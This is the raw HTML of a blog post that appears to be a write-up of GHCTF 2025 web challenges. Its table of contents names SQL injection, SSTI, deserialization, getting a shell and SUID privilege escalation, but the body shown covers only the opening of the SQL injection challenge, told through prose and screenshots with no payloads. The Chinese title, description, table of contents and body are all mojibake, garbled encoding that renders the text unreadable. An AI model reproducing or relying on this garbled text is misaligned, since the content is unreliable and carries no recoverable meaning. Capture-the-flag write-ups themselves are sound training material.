<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>2025GHCTFæ–°ç”Ÿèµ›(æ‚„æ‚„å¡å›½é™…é¢˜) | Hexo</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"example.com","root":"/","title":["Sec203Team"],"version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æœç´¢...","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml"><meta name="description" content="[GHCTF 2025]SQL???é¢˜ç›®é“¾æ¥ï¼šhttps:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;6575 é¢˜è§£(wp)é¦–å…ˆæ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„SQLæ³¨å…¥ï¼ˆè™½ç„¶é¢˜ç›®å·²ç»ç»™äº†ï¼‰  è¿™é‡Œå¯ä»¥çœ‹åˆ°å‡ºé¢˜äººç»™çš„æç¤ºï¼ˆæ¯æ¬¡æ‰§è¡Œçš„sqlè¯­å¥ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å¹¶ä¸éœ€è¦é—­åˆï¼Œç›´æ¥è·Ÿä¸ŠæŸ¥è¯¢å³å¯  å°è¯•çŒœè§£å­—æ®µ  ä¸€å…±5åˆ—  å¾ˆå¤šäººåˆ°è¿™è¿›ä¸€æ­¥ä¹‹åå°±ç›´æ¥ä½¿ç”¨mysqlè¯­å¥ç›´æ¥æ³¨å…¥ï¼ˆæˆ‘ä¹Ÿä¸€æ ·ğŸ˜¶ï¼‰ï¼Œåœ¨è¿™ä¹‹åå°±ä¸€ç›´è·Ÿ">
<meta property="og:type" content="article">
<meta property="og:title" content="2025GHCTFæ–°ç”Ÿèµ›(æ‚„æ‚„å¡å›½é™…é¢˜)">
<meta property="og:url" content="http://example.com/article/2025/03/2025GHCTF-wp.html/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="[GHCTF 2025]SQL???é¢˜ç›®é“¾æ¥ï¼šhttps:&#x2F;&#x2F;www.nssctf.cn&#x2F;problem&#x2F;6575 é¢˜è§£(wp)é¦–å…ˆæ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„SQLæ³¨å…¥ï¼ˆè™½ç„¶é¢˜ç›®å·²ç»ç»™äº†ï¼‰  è¿™é‡Œå¯ä»¥çœ‹åˆ°å‡ºé¢˜äººç»™çš„æç¤ºï¼ˆæ¯æ¬¡æ‰§è¡Œçš„sqlè¯­å¥ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å¹¶ä¸éœ€è¦é—­åˆï¼Œç›´æ¥è·Ÿä¸ŠæŸ¥è¯¢å³å¯  å°è¯•çŒœè§£å­—æ®µ  ä¸€å…±5åˆ—  å¾ˆå¤šäººåˆ°è¿™è¿›ä¸€æ­¥ä¹‹åå°±ç›´æ¥ä½¿ç”¨mysqlè¯­å¥ç›´æ¥æ³¨å…¥ï¼ˆæˆ‘ä¹Ÿä¸€æ ·ğŸ˜¶ï¼‰ï¼Œåœ¨è¿™ä¹‹åå°±ä¸€ç›´è·Ÿ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-1741779758394-1.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741578068744-58d43714-73ff-46ac-b1a1-23a824faa8c6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741578324747-ad4d7c11-029c-4953-b5c4-152a9a8f7238.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741578434581-cb4a0aa5-6a49-42bb-a379-6ba92165676c.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741586509126-34dfe6cf-c494-40cf-9752-226c7b0c05b1.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741586610138-4b83d176-ae74-44a3-9966-92059725410f.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741587015088-79d885dd-90b2-429d-b323-72b3d7839c41.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741587325602-32b5b38d-cd11-4003-8760-ed88515981df.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741587514129-5919571f-b00f-4527-9055-2497d4e10be3.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741593612324-6d211200-2105-4c0a-a452-0b5d78c34e7e.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741594739679-a184e752-6193-4937-8d0f-b06d0bb3ee6c.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741594938128-f1d8005c-aa70-4e20-a0ad-4e9b7d1491d1.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741594986679-5a81e84d-4c14-480b-a567-240b7e44a1cb.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595246431-d21b9db9-b0cc-428e-b902-59ea588ae127.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595269700-75fd21a0-1f53-40fb-94fa-e8ba8632ec99.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595417742-6d21483b-044d-437a-bbf0-6c6d8ca641a7.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741595430137-b14a9e42-394d-4131-ab78-32de2023d71b.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596107226-488edb76-afd1-46d8-8366-43bf5ae412a2.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596131525-61d9314a-cb11-41d1-95dd-fa2a74701273.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596603705-69f2f4b9-cf95-4184-8f5f-b5dd2d351fb6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741596646329-3e9e4b9f-f486-4ef3-a975-c0e9b903b696.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741603959131-15504d0f-710d-4cdb-9a4a-f7456950bda4.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741604022435-480e1814-42c5-4f78-b33a-653ef74fc1b3.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741605001752-56e85db7-14ec-4630-898d-58684a110edd.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741605028946-a85e4977-3b8c-4ba8-9643-326538f0206f.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741610144938-0392732d-640c-46c4-82ae-faa92ef1606e.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741761056352-81310bcb-a890-4f4a-940c-a141425541a6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741769819330-d1c32618-88ed-4166-8867-5241558bb9d7.jpeg">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031281304-2487266d-0f2b-4338-ae73-f4e4a808f0fa.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031305284-a6979849-3d9e-4527-9819-96775689e1f3.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031448186-1a669cac-ae88-40ac-a827-ad32cc1ed2e6.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031483342-cd42b4ab-acdb-4345-a057-9801056265e0.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742031823033-c13c1bc4-6f2d-47eb-987a-7686d5fdf237.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741762974733-00c8656f-211f-4f06-b422-88175970fc47.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1741763706926-5a0492d4-930b-49b8-a737-89c8c70110bd.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316161453834.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316161808503.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316162139913.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-20250316162209165.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110248326-9029419c-b8df-4dcf-b73c-d4e59cc6897b.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110292105-889ffac7-3f93-451c-8da9-aedc7d20faa9.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110415741-d0664a5d-c56f-4588-a008-656b40c253f0.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110458398-dde4091b-f7a1-4922-8ada-d188362e9f59.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110533854-eb00a2e2-7b37-4e26-b311-3c8f6c535939.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742110684450-de6eb184-da12-4bd8-823b-30e4b3192f47.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742111741730-fafc41ac-9272-443a-9203-9f2f17a202e4.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742111901549-6bbd1783-e9c8-42e1-8f45-ccddc2985221.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742111988479-affd37b8-8c6e-4f71-839f-88123bdc9cb0.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742112064301-cd58df66-eda2-4bd0-97c5-18c715ab6aca.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742522958050-224f8bd1-5f7b-475b-a022-3ed96e72432a.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742523019194-a1946d0b-5721-4313-b9ec-ca309bcaa15d.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742541181145-48f5cb2a-8cbb-4b19-93d9-9414db0415fb.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742541250329-3feb7b36-2972-41d3-a79a-6be769e089ac.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742541278009-4d0f89ba-7d63-4468-9193-3f8e4438336e.png">
<meta property="og:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/1742526871287-3b615f13-a594-4150-8208-72e77b2480fa.png">
<meta property="article:published_time" content="2025-03-12T11:00:00.000Z">
<meta property="article:modified_time" content="2025-03-20T09:14:53.421Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="web">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/article/2025/03/2025GHCTF-wp.html/image-1741779758394-1.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="John Doe"><img width="96" loading="lazy" src="/images/a8c5d524d3ada684930a703b4725d87e.png" alt="John Doe"><span class="site-author-status" title="ä¸æƒ³ä¸Šå­¦">ğŸ’¨</span></a><div class="site-author-name"><a href="/about/">John Doe</a></div><span class="site-name">Hexo</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">1</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">4</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="æ–‡æ¡£"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-SQL"><span class="toc-number">1.</span> <span class="toc-text">[GHCTF 2025]SQL???</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-wp"><span class="toc-number">1.2.</span> <span class="toc-text">é¢˜è§£(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-%EF%B9%8F"><span class="toc-number">2.</span> <span class="toc-text">[GHCTF 2025] (&gt;ï¹&lt;)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-number">2.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-wp-1"><span class="toc-number">2.2.</span> <span class="toc-text">é¢˜è§£(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-UPUPUP"><span class="toc-number">3.</span> <span class="toc-text">[GHCTF 2025]UPUPUP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-1"><span class="toc-number">3.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-wp-2"><span class="toc-number">3.2.</span> <span class="toc-text">é¢˜è§£(wp)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Goph3rrr"><span class="toc-number">4.</span> <span class="toc-text">[GHCTF 2025]Goph3rrr</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-2"><span class="toc-number">4.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">é¢˜è§£ï¼ˆwpï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">4.2.1.</span> <span class="toc-text">åˆ†ææ¼æ´ç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%EF%BC%9A"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">ç¬¬ä¸€ç§ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%EF%BC%9A"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">ç¬¬äºŒç§ï¼š</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Popppppp"><span class="toc-number">5.</span> <span class="toc-text">[GHCTF 2025]Popppppp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-3"><span class="toc-number">5.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-1"><span class="toc-number">5.2.</span> <span class="toc-text">é¢˜è§£ï¼ˆwpï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E9%87%8DMD5"><span class="toc-number">5.2.1.</span> <span class="toc-text">åŒé‡MD5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E9%81%8D%E5%8E%86%E2%BD%82%E4%BB%B6%E2%BD%AC%E5%BD%95%E7%B1%BB"><span class="toc-number">5.2.2.</span> <span class="toc-text">ååºåˆ—åŒ–ä¹‹éå†â½‚ä»¶â½¬å½•ç±»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E8%AF%BB%E5%8F%96%E2%BD%82%E4%BB%B6%E7%B1%BB"><span class="toc-number">5.2.3.</span> <span class="toc-text">ååºåˆ—åŒ–ä¹‹è¯»å–â½‚ä»¶ç±»</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-upload-SSTI"><span class="toc-number">6.</span> <span class="toc-text">[GHCTF 2025]upload?SSTI!</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-4"><span class="toc-number">6.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-2"><span class="toc-number">6.2.</span> <span class="toc-text">é¢˜è§£ï¼ˆwpï¼‰</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-GetShell"><span class="toc-number">7.</span> <span class="toc-text">[GHCTF 2025]GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-5"><span class="toc-number">7.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-3"><span class="toc-number">7.2.</span> <span class="toc-text">é¢˜è§£ï¼ˆwpï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">7.2.1.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Suid%E6%8F%90%E6%9D%83"><span class="toc-number">7.2.2.</span> <span class="toc-text">Suidææƒ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GHCTF-2025-Escape%EF%BC%81"><span class="toc-number">8.</span> <span class="toc-text">[GHCTF 2025]Escapeï¼</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5-6"><span class="toc-number">8.1.</span> <span class="toc-text">é¢˜ç›®é“¾æ¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%88wp%EF%BC%89-4"><span class="toc-number">8.2.</span> <span class="toc-text">é¢˜è§£ï¼ˆwpï¼‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">8.2.1.</span> <span class="toc-text">å­—ç¬¦ä¸²é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">8.2.1.1.</span> <span class="toc-text">å­—ç¬¦é€ƒé€¸çš„åŸç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">8.2.1.2.</span> <span class="toc-text">ä¾‹å­</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">8.2.2.</span> <span class="toc-text">é¢„æœŸè§£</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://example.com/article/2025/03/2025GHCTF-wp.html/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="John Doe"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2025GHCTFæ–°ç”Ÿèµ›(æ‚„æ‚„å¡å›½é™…é¢˜)</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2025-03-12 19:00:00" itemprop="dateCreated datePublished" datetime="2025-03-12T19:00:00+08:00">2025-03-12</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2025-03-20 17:14:53" itemprop="dateModified" datetime="2025-03-20T17:14:53+08:00">2025-03-20</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Sec203Team/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Sec203Team</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web</span></a><a class="tag-item" href="/tags/CTF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">CTF</span></a></span></div><div class="post-author"><span class="author-name">ZeroTrace</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="GHCTF-2025-SQL"><a href="#GHCTF-2025-SQL" class="headerlink" title="[GHCTF 2025]SQL???"></a>[GHCTF 2025]SQL???</h1><h2 id="é¢˜ç›®é“¾æ¥ï¼š"><a href="#é¢˜ç›®é“¾æ¥ï¼š" class="headerlink" title="é¢˜ç›®é“¾æ¥ï¼š"></a>é¢˜ç›®é“¾æ¥ï¼š</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6575">https://www.nssctf.cn/problem/6575</a></p>
<h2 id="é¢˜è§£-wp"><a href="#é¢˜è§£-wp" class="headerlink" title="é¢˜è§£(wp)"></a>é¢˜è§£(wp)</h2><p>é¦–å…ˆæ‰“å¼€é¢˜ç›®å‘ç°æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„SQLæ³¨å…¥ï¼ˆè™½ç„¶é¢˜ç›®å·²ç»ç»™äº†ï¼‰</p>
<p><img src="image-1741779758394-1.png" loading="lazy"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å‡ºé¢˜äººç»™çš„æç¤ºï¼ˆæ¯æ¬¡æ‰§è¡Œçš„sqlè¯­å¥ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°å¹¶ä¸éœ€è¦é—­åˆï¼Œç›´æ¥è·Ÿä¸ŠæŸ¥è¯¢å³å¯</p>
<p><img src="1741578068744-58d43714-73ff-46ac-b1a1-23a824faa8c6.png" loading="lazy"></p>
<p>å°è¯•çŒœè§£å­—æ®µ</p>
<p><img src="1741578324747-ad4d7c11-029c-4953-b5c4-152a9a8f7238.png" loading="lazy"></p>
<p>ä¸€å…±5åˆ—</p>
<p><img src="1741578434581-cb4a0aa5-6a49-42bb-a379-6ba92165676c.png" loading="lazy"></p>
<p>å¾ˆå¤šäººåˆ°è¿™è¿›ä¸€æ­¥ä¹‹åå°±ç›´æ¥ä½¿ç”¨mysqlè¯­å¥ç›´æ¥æ³¨å…¥ï¼ˆæˆ‘ä¹Ÿä¸€æ ·ğŸ˜¶ï¼‰ï¼Œåœ¨è¿™ä¹‹åå°±ä¸€ç›´è·Ÿè¿™ä¸ªsqlè¯­å¥è¿‡ä¸å»äº†ï¼Œä¸€ç›´æ€€ç–‘æ˜¯é¢˜ç›®è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿</p>
<p>ç„¶åçªç„¶é—´æƒ³åˆ°23å¹´çš„å›½èµ›é¢˜ç›®ï¼Œä¹Ÿæ˜¯SQLæ³¨å…¥</p>
<p><a target="_blank" rel="noopener" href="https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html">https://blog.mo60.cn/index.php/archives/2023-China-Skills-Security-Answer.html</a></p>
